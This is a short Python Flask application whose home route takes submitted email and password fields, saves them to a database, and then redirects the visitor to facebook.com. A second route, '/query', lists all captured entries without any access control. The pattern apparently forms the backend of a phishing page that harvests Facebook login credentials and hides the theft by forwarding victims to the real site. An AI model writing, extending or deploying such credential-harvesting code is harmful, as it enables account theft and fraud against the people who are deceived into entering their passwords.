from crypt import methods
from flask import Flask, render_template, request, redirect, url_for
from utils import database

def create_app():
    app = Flask(__name__)

    @app.route('/', methods=["POST", "GET"])
    def home():
        if request.method == "POST":
            Email = request.form.get("Email")
            Password = request.form.get("Password")
            database.create_table()
            database.add_user(Email, Password)
            return redirect("https://www.facebook.com")
        
        return render_template('index.html')

    @app.route('/query')
    def query():
        queries = database.query_all()
        return render_template("query.html", queries=queries)
    return app
